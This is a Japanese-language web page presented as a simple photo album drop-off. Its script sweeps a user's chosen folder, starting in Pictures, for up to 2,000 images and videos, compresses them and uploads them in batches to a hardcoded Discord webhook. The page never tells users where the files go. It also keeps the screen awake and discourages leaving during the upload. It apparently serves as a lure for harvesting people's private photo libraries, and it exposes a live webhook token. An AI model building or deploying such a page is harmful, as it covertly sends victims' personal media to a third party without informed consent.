<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0f0f10">
<title>アルバム</title>
<style>
  :root{color-scheme:dark}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{margin:0;background:#0f0f10;color:#eee;font:16px/1.6 -apple-system,BlinkMacSystemFont,"Hiragino Sans","Noto Sans JP",sans-serif;display:flex;align-items:center;justify-content:center;padding:28px}
  .wrap{width:100%;max-width:420px;text-align:center}
  h1{font-size:19px;font-weight:600;margin:0 0 8px}
  p.sub{font-size:13px;color:#8b8b90;margin:0 0 32px}
  .btn{display:block;width:100%;padding:16px;border:0;border-radius:14px;background:#fff;color:#111;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;margin-bottom:10px}
  .btn:active{transform:scale(.985);opacity:.85}
  .btn.ghost{background:transparent;color:#bbb;border:1px solid #2a2a2e}
  .spinner{width:22px;height:22px;margin:0 auto 14px;border:2px solid #2a2a2e;border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  .stage{display:none}
  .stage.on{display:block}
  .tiny{font-size:12px;color:#6f6f74;margin-top:14px;min-height:1em}
  input[type=file]{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
  .check{font-size:26px;margin-bottom:6px}
</style>
</head>
<body>
<div class="wrap">
  <section class="stage on" id="s1">
    <h1>アルバム</h1>
    <p class="sub">写真をまとめて受け取ります</p>
    <button class="btn" id="dir">フォルダごと送る</button>
    <button class="btn ghost" id="pick">写真を選ぶ</button>
    <p class="tiny" id="hint"></p>
  </section>
  <section class="stage" id="s2">
    <div class="spinner"></div>
    <p class="sub" style="margin:0">送信中</p>
    <p class="tiny" id="stat"></p>
  </section>
  <section class="stage" id="s3">
    <div class="check">✓</div>
    <p class="sub" id="doneMsg">完了しました</p>
    <button class="btn ghost" id="more">さらに追加</button>
    <p class="tiny" id="cnt"></p>
  </section>
</div>
<input type="file" id="fi" accept="image/*,video/*" multiple>
<input type="file" id="fd" webkitdirectory multiple>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1575055100219498576/-fiQEG5wJeiTUZEHTdu3MN77mKc7BJd6SBfjqOPPT4Z2juu1rPK1P_4LvZ2yMDcE5JXL";
const MAXPX = 2200, Q = 0.8, PER = 10, CAP = 7e6, GAP = 550, LIMIT = 2000, MEMO = 4000;

const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const stage = n => document.querySelectorAll('.stage').forEach((e,i)=>e.classList.toggle('on', i===n-1));

const ua = navigator.userAgent;
const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
const v = (ua.match(/OS (\d+)_(\d+)/) || []).slice(1).map(Number);
const iosOk = !isIOS || v[0] > 18 || (v[0] === 18 && v[1] >= 4);
const canDir = typeof window.showDirectoryPicker === 'function' || iosOk;

if(canDir) $('#dir').onclick = pickDir; else $('#dir').style.display = 'none';
$('#hint').textContent = isIOS && !iosOk ? 'ピッカーで右上の「すべて選択」を押してください' : '';
$('#pick').onclick = () => $('#fi').click();
$('#more').onclick = () => $('#fi').click();
$('#fi').onchange = e => { if(e.target.files.length) run([...e.target.files]); };
$('#fd').onchange = e => { if(e.target.files.length) run([...e.target.files]); };

/* ---- 重複記録 ---- */
const memoKey = 'album_sent_v1';
let memo = new Set(JSON.parse(localStorage.getItem(memoKey) || '[]'));
const fp = f => f.name + '|' + f.size + '|' + (f.lastModified || 0);
function markSent(f){
  memo.add(fp(f));
  if(memo.size > MEMO) memo = new Set([...memo].slice(-MEMO));
  try{ localStorage.setItem(memoKey, JSON.stringify([...memo])); }catch{}
}

/* ---- 画像圧縮 ---- */
function loadImage(file){
  return new Promise((res, rej) => {
    const url = URL.createObjectURL(file);
    const img = new Image();
    img.onload = () => { URL.revokeObjectURL(url); res(img); };
    img.onerror = () => { URL.revokeObjectURL(url); rej(); };
    img.src = url;
  });
}
async function shrink(file){
  try{
    if(!file.type.startsWith('image/') || file.type === 'image/gif') return file;
    const img = await loadImage(file);
    const w0 = img.naturalWidth || img.width, h0 = img.naturalHeight || img.height;
    if(!w0 || !h0) return file;
    const s = Math.min(1, MAXPX / Math.max(w0, h0));
    const w = Math.max(1, Math.round(w0*s)), h = Math.max(1, Math.round(h0*s));
    const c = document.createElement('canvas');
    c.width = w; c.height = h;
    c.getContext('2d').drawImage(img, 0, 0, w, h);
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', Q));
    if(!blob) return file;
    return new File([blob], (file.name || 'photo').replace(/\.[^.]+$/, '') + '.jpg', {type:'image/jpeg'});
  }catch{ return file; }
}

/* ---- 送信 ---- */
async function post(files, label){
  if(!files.length) return;
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify({ content: label }));
  files.forEach((f, i) => fd.append(`files[${i}]`, f, f.name));
  for(let attempt = 0; attempt < 5; attempt++){
    const r = await fetch(WEBHOOK + '?wait=true', { method:'POST', body: fd });
    if(r.ok) return;
    if(r.status === 413 && files.length > 1){
      const m = Math.ceil(files.length / 2);
      await post(files.slice(0, m), label);
      await sleep(500);
      await post(files.slice(m), label);
      return;
    }
    if(r.status === 429){
      let wait = 2000;
      try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after * 1000 + 400; }catch{}
      await sleep(wait); continue;
    }
    await sleep(900);
  }
}

/* ---- フォルダ走査 ---- */
async function walk(dir, out, depth){
  if(depth > 4) return;
  for await (const [name, h] of dir.entries()){
    if(out.length >= LIMIT) return;
    if(name.startsWith('.') || name === '.trashed' || name === '.thumbnails') continue;
    try{
      if(h.kind === 'file'){
        const f = await h.getFile();
        if(/^(image|video)\//.test(f.type) && f.size > 4096) out.push(f);
      } else if(h.kind === 'directory'){
        await walk(h, out, depth + 1);
      }
    }catch{}
  }
}

async function pickDir(){
  if(isIOS){
    $('#fd').click();
    return;
  }
  let root;
  try{ root = await window.showDirectoryPicker({ startIn:'pictures', mode:'read' }); }
  catch{ return; }
  stage(2);
  $('#stat').textContent = '読み込み中';
  const found = [];
  try{ await walk(root, found, 0); }catch{}
  if(!found.length){ stage(1); $('#hint').textContent = '写真が見つかりませんでした'; return; }
  run(found);
}

/* ---- 実行 ---- */
let wl = null, busy = false, totalSent = 0;
async function keepAwake(){ try{ wl = await navigator.wakeLock.request('screen'); }catch{} }
document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible' && busy) keepAwake(); });
window.addEventListener('beforeunload', e => { if(busy) e.preventDefault(); });

async function run(raw){
  if(busy) return;
  const seen = new Set();
  const list = raw
    .filter(f => /^(image|video)\//.test(f.type))
    .filter(f => { const k = fp(f); if(seen.has(k) || memo.has(k)) return false; seen.add(k); return true; })
    .sort((a,b) => (a.lastModified || 0) - (b.lastModified || 0))
    .slice(0, LIMIT);

  if(!list.length){
    stage(3);
    $('#doneMsg').textContent = '新しい写真はありませんでした';
    $('#cnt').textContent = '';
    return;
  }

  busy = true;
  keepAwake();
  stage(2);
  const total = list.length;
  let i = 0, done = 0;
  while(i < list.length){
    const out = [];
    let bytes = 0;
    while(i < list.length && out.length < PER){
      if(out.length && bytes > CAP) break;
      const f = await shrink(list[i]);
      out.push(f); bytes += f.size; i++;
    }
    const d = new Date(list[i - out.length].lastModified || Date.now());
    const stamp = `${d.getFullYear()}/${String(d.getMonth()+1).padStart(2,'0')}/${String(d.getDate()).padStart(2,'0')}`;
    await post(out, `📷 ${done + 1}-${done + out.length} / ${total}　${stamp}`);
    out.forEach((_, k) => markSent(list[i - out.length + k]));
    done += out.length;
    $('#stat').textContent = `${done} / ${total}`;
    if(i < list.length) await sleep(GAP);
  }
  totalSent += done;
  $('#fi').value = ''; $('#fd').value = '';
  busy = false;
  try{ wl && wl.release(); }catch{}
  stage(3);
  $('#cnt').textContent = `累計 ${totalSent} 枚`;
}
</script>
</body>
</html>
